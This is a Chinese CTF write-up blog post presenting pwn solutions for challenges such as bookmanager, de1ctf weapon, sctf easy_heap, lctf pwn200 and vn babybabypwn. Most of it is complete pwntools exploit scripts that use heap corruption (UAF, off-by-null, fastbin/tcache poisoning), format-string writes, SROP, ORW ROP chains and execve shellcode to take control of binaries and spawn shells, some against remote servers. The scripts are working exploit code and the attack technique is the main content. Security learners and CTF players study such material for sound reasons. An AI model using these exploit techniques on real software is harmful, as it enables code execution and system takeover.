<p><a href="https://blog.csdn.net/seaaseesa/article/details/103450524" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/103450524</a></p>
<h2 id="护网杯-2018-gettingstart"><a href="#护网杯-2018-gettingstart" class="headerlink" title="护网杯_2018_gettingstart"></a><code>护网杯_2018_gettingstart</code></h2><p>白给题。考浮点数在内存中是怎么存的。</p>
<pre><code class="python">data = &#39;1&#39; * 24 + p64(0x7fffffffffffffff) + p64(0x3FB999999999999A)
s(data)
itr()</code></pre>
<h2 id="OGeek2019-bookmanager"><a href="#OGeek2019-bookmanager" class="headerlink" title="[OGeek2019]bookmanager"></a><code>[OGeek2019]bookmanager</code></h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><ul>
<li>存在heap overflow</li>
<li>uaf</li>
<li>off by one</li>
</ul>
<p>一堆洞，伪代码看起来很复杂，但是利用起来较为简单。</p>
<p>重点漏洞函数在 updata上。</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./pwn-2&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 1
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,29005)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

def add_chapter(name):
    sla(&#39;choice&#39;,&#39;1&#39;)
    sa(&#39;name&#39;,str(name))

def add_section(chapter,name):
    sla(&#39;choice&#39;,&#39;2&#39;)
    sa(&#39;into&#39;,str(chapter))
    sa(&#39;name&#39;,str(name))

def add_text(section,size,data):
    sla(&#39;choice&#39;,&#39;3&#39;)
    sa(&#39;into&#39;,str(section))
    sla(&#39;write&#39;,str(size))
    sa(&#39;Text&#39;,str(data))
def del_chapter(name):
    sla(&#39;choice&#39;,&#39;4&#39;)
    sla(&#39;name&#39;,str(name))

def del_section(name):
    sla(&#39;choice&#39;,&#39;5&#39;)
    sla(&#39;name&#39;,str(name))

def del_text(name):
    sla(&#39;choice&#39;,&#39;6&#39;)
    sla(&#39;name&#39;,str(name))

def show():
    sla(&#39;choice&#39;,&#39;7&#39;)

def edit(type,name,data):
    sla(&#39;choice&#39;,&#39;8&#39;)
    sla(&#39;update&#39;,str(type))
    sa(&#39;name&#39;,str(name))
    sa(&#39;New&#39;,str(data))
sla(&#39;Name&#39;,&#39;chumen77&#39; * 4)
add_chapter(&#39;chumen77&#39;)
add_section(&#39;chumen77&#39;,&#39;1&#39;)
add_section(&#39;chumen77&#39;,&#39;2&#39;)
add_section(&#39;chumen77&#39;,&#39;3&#39;)
add_text(&#39;1&#39;,0x100,&#39;1&#39;*0x100)
# show()
add_text(&#39;2&#39;,0x100,&#39;2&#39;*0x100)
del_section(&#39;1&#39;)
del_section(&#39;2&#39;)
show()
ru(&#39;Section:&#39;)
libc_base = uu64(r(6)) - 0x3c4b78
info_addr(&#39;libc_base&#39;,libc_base)
free_hook = 0x3c67a8 + libc_base
add_text(&#39;3&#39;,0x100,&#39;1&#39;*0x100)

edit(&#39;Section&#39;,3,&#39;3&#39; + &#39;\x00&#39; + &#39;1&#39;*(0x20-2) + &#39;\xd0&#39;)
data = p64(free_hook) + p64(0x20)
edit(&#39;Text&#39;,&#39;3&#39;,data)
one = libc_base + rce16[2]
edit(&#39;Text&#39;,&#39;3&#39;,p64(one))
del_chapter(&#39;chumen77&#39;)
# debug()
itr()</code></pre>
<h3 id="题记-2"><a href="#题记-2" class="headerlink" title="题记"></a>题记</h3><ul>
<li><p>题是简单题，但是由于代码一多，且指针看起来复杂，个人做起来就有点慢，并且让自己连最简单的heap overflow都没有想起来去利用。</p>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4></li>
<li><p>对于指针复杂的堆信息分配，可以直接gdb上手调来确定基本堆信息。</p>
</li>
</ul>
<h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a><code>de1ctf_2019_weapon</code></h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><ul>
<li>uaf</li>
<li>最大只能申请0x60的chunk</li>
<li>没有show函数</li>
<li>部分input利用scanf来获取读入</li>
</ul>
<h3 id="攻击思路-5"><a href="#攻击思路-5" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>free 2个chunk，然后用scanf 读入大量的字符，来获取一个smallbin</li>
<li>利用残留的libc地址，fastbin attck <code>IO_stdout</code>来泄漏libc</li>
<li>fastbin attck <code>malloc_hook</code></li>
</ul>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./de1ctf_2019_weapon&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,28987)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()
def add(idx,size,data):
    sla(&#39;ice&#39;,&#39;1&#39;)
    sla(&#39;size of weapon:&#39;,str(size))
    sla(&#39;dex&#39;,str(idx))
    sa(&#39;name&#39;,str(data))

def free(idx):
    sla(&#39;ice&#39;,&#39;2&#39;)
    sla(&#39;idx&#39;,str(idx))

def edit(idx,data):
    sla(&#39;ice&#39;,&#39;3&#39;)
    sla(&#39;idx&#39;,str(idx))
    sa(&#39;new&#39;,str(data))
def leak_addr():
    add(0,0x60,&#39;1&#39;)
    add(1,0x60,&#39;1&#39;)
    add(2,0x60,&#39;1&#39;)
    add(3,0x60,&#39;1&#39;)
    free(0)
    free(1)
    sla(&#39;ice&#39;,&#39;1&#39; * 0x1000)
    add(4,0x60,p16(0xa5dd))
    free(3)
    free(2)
    free(3)
    edit(3,&#39;\x00&#39;)
    add(5,0x60,&#39;1&#39;)
    add(6,0x60,&#39;1&#39;)
    # debug()
    data = &#39;\x00&#39; * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0)
    add(7,0x60,data)
leak = 0
while True:
    try:
        leak_addr()
        ss = io.recvuntil(chr(0x7f),timeout = 0.5)
        if len(ss) == 0:
            raise Exception(&#39;&#39;)
        io.recv(10)
        leak = uu64(r(6))
        if leak == 0x7ff81b57b6a3:
            raise Exception(&#39;&#39;)
        break
    except Exception:
        io.close()
        # io = process(&#39;./de1ctf_2019_weapon&#39;)
        io = remote(&#39;node3.buuoj.cn&#39;,28987)
        continue

info_addr(&#39;leak&#39;,leak)
libc_addr = leak - 0x3c56a3
info_addr(&#39;libc_base&#39;,libc_addr)
malloc_hook = 0x3c4b10 + libc_addr
free(0)
free(2)
free(0)
edit(0,p64(malloc_hook - 0x13))
add(7,0x60,&#39;1&#39;)
one = rce16[3] + libc_addr
data = &#39;\x00&#39; * 3 + p64(one)
add(8,0x60,data)
sla(&#39;ice&#39;,&#39;1&#39;)
sla(&#39;size of weapon:&#39;,&#39;10&#39;)
sla(&#39;dex&#39;,&#39;9&#39;)
# add(9,0x30,&#39;1&#39;)
# debug()
itr()</code></pre>
<h2 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a><code>starctf_2019_babyshell</code></h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p>会有一个函数检查你的shellcode是否满足要求。</p>
<pre><code class="c"> for ( i = a1; *i; ++i )
  {
    for ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j )
      ;
    if ( !*j )                                  // 检查shellcode合法的函数，遍历shellcode的每个字符，在0x400987处找是否有匹配。
      return 0LL;
  }
  return 1LL;</code></pre>
<p>需要0x400987地址处的字节码匹配。倘若发现有不匹配的字节，就直接check不过。</p>
<p>可以用的有 <code>pop rdx、pop rdi、syscall</code></p>
<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>有师傅的做法，就是用这3个汇编，强行凑出一个read，然后把shellcode再次读到mmap的buf上合适的位置（此题加12），再次调用到shellcode。</p>
<p><a href="https://www.cnblogs.com/Rookle/p/12895895.html" target="_blank" rel="noopener">https://www.cnblogs.com/Rookle/p/12895895.html</a><br><a href="https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode" target="_blank" rel="noopener">https://github.com/sixstars/starctf2019/tree/master/pwn-shellcode</a><br><a href="https://blog.csdn.net/seaaseesa/article/details/105863820" target="_blank" rel="noopener">https://blog.csdn.net/seaaseesa/article/details/105863820</a></p>
<pre><code>对于一些受限的shellcode，我们最好的办法是构造read系统调用。</code></pre><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><p>还有就是这个循环，其实直接可以用<code>\x00</code>截断，因为开头循环条件2 给0 直接就不执行下面的检测循环，return 1 走了。</p>
<p><strong>但是跳过去需要，提前再布置几个机器码字节保证不影响下面的shellcode。</strong></p>
<p>可以直接在ida里面设置显示机器码，以后直接选取合适的机器码整上去就可以了。</p>
<pre><code>00 5A 5A                    add     [rdx+5Ah], bl   </code></pre><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">shellcode = asm(shellcraft.sh())
s(&#39;\x00&#39;+ &#39;\x5a&#39; +&#39;\x00&#39;+ shellcode)</code></pre>
<h3 id="题记-3"><a href="#题记-3" class="headerlink" title="题记"></a>题记</h3><p>感觉个人shellcode能力较差，得抽时间学习下。</p>
<h2 id="hfctf-2020-marksman"><a href="#hfctf-2020-marksman" class="headerlink" title="hfctf_2020_marksman"></a><code>hfctf_2020_marksman</code></h2><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>上来给了libc地址，可以任意地址3个字节的写入。</p>
<h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>修改那里的地址，才能控制程序流程。</p>
<p>可以修改<code>exit_hook</code>:<br><a href="https://blog.csdn.net/qq_43116977/article/details/105485947" target="_blank" rel="noopener">https://blog.csdn.net/qq_43116977/article/details/105485947</a><br>参考这里。</p>
<p>在退出时：</p>
<p><code>exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive</code></p>
<p>修改<code>__rtld_lock_unlock_recursive</code>或者<code>__rtld_lock_lock_recursive</code>即可。</p>
<p><strong>gdb 快速获取这个地址的办法：</strong></p>
<pre><code>pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive</code></pre><h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>one gadget的调整。</p>
<p>其中 <code>one_gadget -lx</code>  这个可以设置扫描等级获取更多的one gadget。</p>
<p>并且在程序中：</p>
<pre><code class="c">signed __int64 __fastcall sub_BC2(_BYTE *a1)
{
  if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u )
    return 1LL;
  puts(&quot;You always want a Gold Finger!&quot;);
  return 0LL;
}</code></pre>
<p>对写入的地址也给限制了不能出现这几个字节。<br>其中就让很好的:</p>
<pre><code>0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL</code></pre><p>不让写入使用了。其他的因为地址小，爆破差距大，或者限制条件高，不适合使用。</p>
<p>想办法调整一下，来实现上面这个one gadget的使用。</p>
<p><a href="http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90" target="_blank" rel="noopener">http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90</a></p>
<p>参考 taqini师傅的这个文章，发现其中就有对这个的分析，发现最重要的就是：<br><code>rsi rdi rdx</code>要给控制好，其中这个gadget附近的汇编如图所示</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/uQchWa.png" srcset="/img/loading.gif" alt></p>
<p>其中8c结尾的汇编之后是一定要执行的，其中就控制了<code>rsi rdi rdx</code>。并且8c这条汇编也是不可以跳过，控制的rax，在这个one gadget 中是很有用的，否则当初作者在写这个one gadget怎么没有跳过，直接从93结尾汇编开始了。</p>
<p>向上看有个call指令，这是对接下来的one gadget执行并无造成重要参数大的影响的，所以可以尝试向上写一个地址，让这个gadget从<code>0x10a387</code>开始。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/hDqu69.png" srcset="/img/loading.gif" alt><br>执行下去发现是可以满足<code>execve(&quot;/bin/sh&quot;, 0, environ)</code>的。</p>
<p>此题中对于exit hook 的改写中，<code>_dl_rtld_lock_recursive</code> 可以完成条件的满足。<code>_dl_rtld_unlock_recursive</code>不可以。<br>具体跟过去会发现是在第2和参数出了问题，且在one gadget中第二个参数的控制很玄学，且很难控制，让人头大。</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">ru(&#39;0x&#39;)
libc_base = int(r(12),16) - libc.sym[&#39;puts&#39;]
info_addr(&#39;libc_base&#39;,libc_base)
exit_hook = 0x81df60 + libc_base
one = 0x10a387 + libc_base
# debug()
sl(str(exit_hook))
sla(&#39;biang&#39;,chr((one  &amp;0xff)))
sla(&#39;biang!&#39;,chr((one &gt;&gt; 8 &amp;0xff)))
sla(&#39;biang!&#39;,chr((one &gt;&gt; 16 &amp;0xff)))
itr()</code></pre>
<h3 id="题记-4"><a href="#题记-4" class="headerlink" title="题记"></a>题记</h3><p>对于修改<code>_dl_fini</code>，又发现了一个很好的参考链接：<br><a href="https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1</a></p>
<h2 id="sctf-2019-easy-heap"><a href="#sctf-2019-easy-heap" class="headerlink" title="sctf_2019_easy_heap"></a><code>sctf_2019_easy_heap</code></h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开头mmap 一段内存 rwx</li>
<li>libc 2.27的off by null</li>
<li>没有show</li>
</ul>
<h3 id="攻击思路-6"><a href="#攻击思路-6" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>先上来申请一个0x1000的内存块，然后释放，可以保证每次申请的堆块上都存有libc信息，准备攻击利用</li>
<li>off by null 留出 2个重叠的堆块</li>
<li>一个攻击 mmap，另一个攻击malloc hook</li>
</ul>
<p>由于tcache 基本没有什么检查，利用起来较为容易。</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./sctf_2019_easy_heap&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,28382)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

def add(size):
    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)
    sla(&#39;ize&#39;,str(size))

def free(idx):
    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)
    sla(&#39;dex&#39;,str(idx))

def edit(idx,data):
    sla(&#39;&gt;&gt;&#39;,&#39;3&#39;)
    sla(&quot;dex&quot;,str(idx))
    sa(&#39;tent&#39;,str(data))
ru(&#39;0x&#39;)
mmap = int(r(10),16)
add(0x1000)
add(0x10) #1
free(0)
add(0x90) #0
add(0x28) #2
add(0x18) #3
add(0xf0) #4
for i in range(7):
    add(0x90)
for i in range(7):
    free(i+5)
    add(0xf0)
for i in range(7):
    free(i+5)

free(0)
edit(3,&#39;\x00&#39; * 0x10 + p64(0xb0+0x40))
free(4)
add(0x28) #0
add(0x28) #4
add(0x18) #5
add(0x10) #6
add(0x28) #7
add(0x18) #8
free(4)
free(7)
edit(2,&#39;\x60&#39; + &#39;\n&#39;)
edit(0,p64(mmap) + &#39;\n&#39;)
add(0x28) #4
add(0x28) #7
add(0x28) #9

free(6)
free(8)
edit(3,&#39;\xc0&#39; + &#39;\n&#39;)
edit(5,p8(0x30) + &#39;\n&#39;)
add(0x18) #6
add(0x18) #8
add(0x18) #10
shellcode = &quot;&quot;&quot;
  call here
  .ascii &quot;/bin/sh&quot;
  .byte 0
here:
   pop rdi
   xor rsi,rsi
   xor rdx,rdx
   mov rax,0x3b
   syscall
&quot;&quot;&quot;
edit(9,asm(shellcode) + &#39;\n&#39;)
edit(10,p64(mmap) + &#39;\n&#39;)
add(0x200)
# debug()
itr()</code></pre>
<h3 id="题记-5"><a href="#题记-5" class="headerlink" title="题记"></a>题记</h3><p>这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。</p>
<p>另外一种解法，就是攻击stdout，泄漏libc地址，然后攻击malloc hook。</p>
<h2 id="ciscn-2019-sw-1"><a href="#ciscn-2019-sw-1" class="headerlink" title="ciscn_2019_sw_1"></a><code>ciscn_2019_sw_1</code></h2><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>32位，单次格式化字符串的利用。无法一次性的获得shell。至少运行2次。</p>
<p>攻击<code>__do_global_dtors_aux_fini_array_entry</code>，让其再次运行一次，且同时改 printf got 的值为system plt。然后送一个 <code>/bin/sh\x00</code>即可。</p>
<h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">offset = 4
payload = fmtstr_payload(offset,{0x804979C:0x8048534,elf.got[&#39;printf&#39;]:elf.plt[&#39;system&#39;]},write_size = &quot;short&quot;,numbwritten = 0)
s(payload)
sleep(1)
sa(&#39;name&#39;,&#39;/bin/sh\x00&#39;)
itr()</code></pre>
<p>因为是32位，用<code>fmtstr_payload</code>是很好用的。</p>
<h2 id="lctf2016-pwn200"><a href="#lctf2016-pwn200" class="headerlink" title="lctf2016_pwn200"></a><code>lctf2016_pwn200</code></h2><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开头不输入<code>\n</code>，48字符可以泄露出stack地址</li>
<li>有第一段可控的栈，且可以覆盖到heap ptr</li>
</ul>
<pre><code class="c">int sub_400A29()
{
  char buf; // [rsp+0h] [rbp-40h]
  char *dest; // [rsp+38h] [rbp-8h]

  dest = (char *)malloc(0x40uLL);
  puts(&quot;give me money~&quot;);
  read(0, &amp;buf, 0x40uLL);
  strcpy(dest, &amp;buf);
  ptr = dest;
  return sub_4009C4();
}</code></pre>
<ul>
<li>一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。</li>
</ul>
<p>保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。</p>
<h3 id="攻击思路-7"><a href="#攻击思路-7" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul>
<li>利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address</li>
<li>申请同大小的堆，改ret address jmp 到 shellcode</li>
</ul>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./pwn200&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,26670)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

def add(size,data):
    sla(&#39;choice&#39;,&#39;1&#39;)
    sla(&#39;long&#39;,str(size))
    sa(&#39;me&#39;,str(data))

def free():
    sla(&#39;choice&#39;,&#39;2&#39;)

shellcode = asm(shellcraft.sh())
sa(&#39;u&#39;,shellcode)
ru(&#39;\x05&#39;)
leak_stack = uu64(r(6))
info_addr(&#39;leak_stack&#39;,leak_stack)
shellcode_addr = leak_stack - 0x50
# debug()
sla(&#39;id&#39;,&#39;65&#39;)
payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90)
sa(&#39;money&#39;,payload)
free()
payload = p64(0)*3 + p64(shellcode_addr)
add(0x38,payload)
sleep(0.2)
sla(&#39;choice&#39;,&#39;3&#39;)
# debug()
itr()</code></pre>
<h2 id="vn-pwn-babybabypwn"><a href="#vn-pwn-babybabypwn" class="headerlink" title="vn_pwn_babybabypwn"></a><code>vn_pwn_babybabypwn</code></h2><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><ul>
<li>开了沙盒保护，只能orw</li>
<li>开始给了libc地址</li>
<li>程序主要执行了<code>rt_sigreturn</code>，肯定是奔着srop去的</li>
</ul>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><ul>
<li>orw的rop应该往哪里写，栈地址是不知道的</li>
</ul>
<p>可以在libc上找一段无用的地方进行写即可。比如 libc的bss，free hook段。</p>
<ul>
<li>有的gadget 使用ropgadget找不到</li>
</ul>
<pre><code class="python">libc.search(asm(&quot;syscall \nret&quot;)).next() </code></pre>
<p>可以通过机器码来找。</p>
<ul>
<li>srop 中frame执行的顺序</li>
</ul>
<p>frame.rip 是先执行的地址。而 frame.rsp 的值就是我们执行完 frame.rip 后，要执行的值</p>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">#!/usr/bin/env python
# encoding: utf-8
from pwn import *
import time
local_file  = &#39;./vn_pwn_babybabypwn&#39;
elf = ELF(local_file)
context.log_level = &#39;debug&#39;
debug = 0
if debug:
    io = process(local_file)
    libc = elf.libc
else:
    io = remote(&#39;node3.buuoj.cn&#39;,25535)
    libc = elf.libc
    #libc = ELF(&#39;.&#39;)
context.arch = elf.arch
context.terminal = [&#39;tmux&#39;,&#39;neww&#39;]
#,&#39;&#39;splitw&#39;,&#39;-h&#39;
rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]
rce18 = [0x4f2c5,0x4f322,0x10a38c]
realloc = [0x2,0x4,0x6,0xB,0xC,0xD]
arae18 = 0x3ebca0
s      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
r      = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))
itr     = lambda                    :io.interactive()
def debug():
    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)
    gdb.attach(io)
    pause()

&#39;
line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015
 0005: 0x15 0x09 0x00 0x00000009  if (A == mmap) goto 0015
 0006: 0x15 0x08 0x00 0x0000000a  if (A == mprotect) goto 0015
 0007: 0x15 0x07 0x00 0x00000029  if (A == socket) goto 0015
 0008: 0x15 0x06 0x00 0x0000002a  if (A == connect) goto 0015
 0009: 0x15 0x05 0x00 0x00000031  if (A == bind) goto 0015
 0010: 0x15 0x04 0x00 0x00000032  if (A == listen) goto 0015
 0011: 0x15 0x03 0x00 0x00000038  if (A == clone) goto 0015
 0012: 0x15 0x02 0x00 0x00000039  if (A == fork) goto 0015
 0013: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0015
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0015: 0x06 0x00 0x00 0x00000000  return KILL
&#39;

ru(&#39;0x&#39;)
libc_base =  int(r(12),16) - libc.sym[&#39;puts&#39;]
info_addr(&#39;libc_base&#39;,libc_base)

free_hook = 0x3c67a8 + libc_base
read = libc.sym[&#39;read&#39;] + libc_base
puts = libc.sym[&#39;puts&#39;] + libc_base
open = libc.sym[&#39;open&#39;] + libc_base
pop_rdi= 0x0000000000021102 + libc_base
pop_rsi = 0x00000000000202e8 + libc_base
pop_rdx = 0x0000000000001b92 + libc_base
syscall_ret = libc.search(asm(&quot;syscall \nret&quot;)).next() + libc_base
# syscall_ret = libc_base + 0x00000000000bc375 #: syscall; ret; 
frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = free_hook
frame.rdx = 0x300
frame.rip = syscall_ret
frame.rsp = free_hook
payload = str(frame)[8:] #前8字节是rt_sigreturn 其并不需要伪造。程序是主动调用的 sigreturn

# print(hex(len(frame)))

s(payload)
orw = flat([
    pop_rdi,0,pop_rsi,free_hook,pop_rdx,8,read,
    pop_rdi,free_hook,pop_rsi,0,pop_rdx,0,open,
    pop_rdi,3,pop_rsi,free_hook,pop_rdx,0x30,read,
    pop_rdi,free_hook,puts
])

s(orw)
sleep(0.2)
s(&#39;./flag&#39;)
# debug()
itr()</code></pre>
<h3 id="题记-6"><a href="#题记-6" class="headerlink" title="题记"></a>题记</h3><pre><code class="python">payload = str(frame)[8:] </code></pre>
<p>对于为什么要从8字节开始的理解？</p>
<p>前8字节是<code>rt_sigreturn</code>,其有什么用？</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/votJbl.png" srcset="/img/loading.gif" alt></p>
